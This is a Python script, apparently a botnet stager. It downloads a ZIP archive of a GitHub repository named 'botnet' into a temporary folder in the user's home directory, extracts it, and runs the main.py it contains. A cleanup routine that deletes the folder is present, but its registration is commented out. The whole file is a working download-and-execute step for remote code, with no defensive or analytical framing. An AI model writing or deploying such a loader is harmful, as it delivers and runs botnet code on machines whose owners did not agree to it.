import atexit
import os
import subprocess
import shutil
import sys
import urllib.request
import zipfile
from pathlib import Path

home_dir = Path.home()
working_dir = home_dir / "temp_folder"
github_zip_url = "https://github.com/VinceDriesen/botnet/archive/refs/heads/main.zip" 

def main():
    zip_filepath = working_dir / "repo_download.zip"
    working_dir.mkdir(parents=True, exist_ok=True)

    print(f"Downloading ZIP from {github_zip_url}...")
    try:
        # Download the zip file
        urllib.request.urlretrieve(github_zip_url, zip_filepath)
        
        print("Extracting ZIP...")
        with zipfile.ZipFile(zip_filepath, 'r') as zip_ref:
            zip_ref.extractall(working_dir)
            
        # GitHub ZIPs wrap the contents in a top-level folder (e.g., 'repository-main').
        # We need to find that folder dynamically to locate main.py.
        extracted_folders = [
            item for item in os.listdir(working_dir) 
            if os.path.isdir(os.path.join(working_dir, item))
        ]
        
        if not extracted_folders:
            print("Error: Could not find extracted repository folder.")
            return
            
        # Assume the first directory found is the extracted repo folder
        repo_root = os.path.join(working_dir, extracted_folders[0])
        script_path = os.path.join(repo_root, "main.py")
        
        if os.path.exists(script_path):
            print(f"Executing {script_path}...")
            # Run the script inside the extracted folder
            subprocess.run([sys.executable, "main.py"], cwd=repo_root, check=True)
        else:
            print(f"Error: Could not find 'main.py' in {repo_root}")
            
    except urllib.error.URLError as e:
        print(f"Failed to download the ZIP file: {e}")
    except zipfile.BadZipFile:
        print("The downloaded file was not a valid ZIP file.")
    except subprocess.CalledProcessError as e:
        print(f"An error occurred while running the script: {e}")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")

def cleanup_scripts():
    if working_dir and os.path.exists(working_dir):
        print(f"\nCleaning up: removing directory '{working_dir}'...")
        try:
            shutil.rmtree(working_dir)
            print("Cleanup finished successfully.")
        except Exception as e:
            print(f"Failed to clean up '{working_dir}': {e}")


# atexit.register(cleanup_scripts)

if __name__ == "__main__":
    main()
